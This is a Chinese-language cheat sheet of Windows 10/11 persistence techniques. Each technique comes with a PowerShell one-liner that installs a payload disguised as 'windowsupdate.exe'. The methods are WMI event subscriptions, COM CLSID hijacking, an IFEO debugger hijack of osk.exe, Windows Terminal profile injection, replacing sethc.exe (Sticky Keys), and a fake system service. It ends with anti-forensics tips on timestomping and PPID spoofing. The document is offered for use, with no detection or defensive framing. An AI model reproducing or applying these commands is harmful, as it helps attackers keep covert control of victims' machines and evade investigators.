# Windows 10/11 Advanced Persistence Matrix

## 核心准则

* **隐蔽性**: 避开 `msconfig` 和 `Task Manager` 的启动项枚举。
* **权限**: 多数操作需要 **Administrator** 或 **SYSTEM** 权限。
* **目标路径**: `C:\core\windowsupdate.exe`

---

## 1. WMI 事件订阅 (WMI Event Subscription)

**原理**: 利用 WMI 永久事件消费者，将特定系统事件（如启动、时间触发）与执行程序绑定。它不属于任何启动文件夹或注册表运行键。

### PowerShell 一键配置：

```powershell
$F=Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='WinUpdateF';EventNamespace='root\cimv2';QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 0"}; $C=Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='WinUpdateC';CommandLineTemplate='C:\core\windowsupdate.exe'}; Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$F;Consumer=$C}

```

---

## 2. COM 组件劫持 (CLSID Hijacking)

**原理**: 劫持常用应用或系统组件调用的 CLSID。例如，劫持 `InprocServer32` 路径，当系统加载特定 Shell 扩展（如右键菜单、文件预览）时，触发加载。

### PowerShell 一键配置（劫持文件夹背景关联）：

```powershell
New-Item -Path "HKCU:\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32" -Force | Out-Null; New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32" -Name "(Default)" -Value "C:\core\windowsupdate.exe" -PropertyType String -Force

```

---

## 3. 映像劫持 (IFEO - Image File Execution Options)

**原理**: 为指定的可执行文件设置“调试器”。当系统尝试运行 `Target.exe` 时，实际上运行的是 `Debugger` 参数指定的程序。

### PowerShell 一键配置（以劫持屏幕键盘 OSK 为例）：

```powershell
$P='HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe'; New-Item -Path $P -Force; New-ItemProperty -Path $P -Name "Debugger" -Value "C:\core\windowsupdate.exe" -PropertyType String -Force

```

---

## 4. Win11 终端配置文件注入 (Terminal Profiles Injection)

**原理**: Windows 11 默认使用 `Windows Terminal`。通过修改其 `settings.json`，在终端启动时静默执行程序。

### PowerShell 一键配置：

```powershell
$json=(Get-Content "$env:LOCALAPPDATA\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json" -Raw | ConvertFrom-Json); $json.profiles.list += @{name="Update"; commandline="C:\core\windowsupdate.exe"; hidden=$true}; $json | ConvertTo-Json -Depth 10 | Set-Content "$env:LOCALAPPDATA\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json"

```

---

## 5. 辅助功能代理 (Accessibility Tools / Sticky Keys)

**原理**: 替换 `sethc.exe`（粘滞键）或 `utilman.exe`。在登录界面按 5 次 Shift 即可触发。

### PowerShell 一键配置（需更改文件所有权）：

```powershell
takeown /f C:\Windows\System32\sethc.exe; icacls C:\Windows\System32\sethc.exe /grant administrators:F; Copy-Item "C:\core\windowsupdate.exe" "C:\Windows\System32\sethc.exe" -Force

```

---

## 6. 无描述服务自启 (Service SCM Stealth)

**原理**: 创建一个伪装成系统组件的服务。即使在“服务”列表中可见，只要描述为空或伪装成关键服务，极少被用户手动停止。

### PowerShell 一键配置：

```powershell
New-Service -Name "WinNetSvc" -BinaryPathName "C:\core\windowsupdate.exe" -DisplayName "Windows Network Core Service" -StartupType Automatic -Description " "

```

---

## [EDGE CASES & OPTIMIZATION]

| 方案 | 隐蔽等级 | 权限要求 | 备注 |
| --- | --- | --- | --- |
| **WMI** | 极高 | Administrator | 无进程残留，由 `WmiPrvSE.exe` 拉起 |
| **COM 劫持** | 高 | User | 针对特定用户行为触发 |
| **IFEO** | 中 | Administrator | 会导致原程序（如 osk.exe）无法正常运行 |
| **Win11 Terminal** | 中 | User | 依赖用户打开终端的行为 |

* **反取证建议**: 建议将 `windowsupdate.exe` 的时间戳修改为与 `kernel32.dll` 一致，并配置 **Parent Process ID (PPID) Spoofing** 以绕过进程树分析。
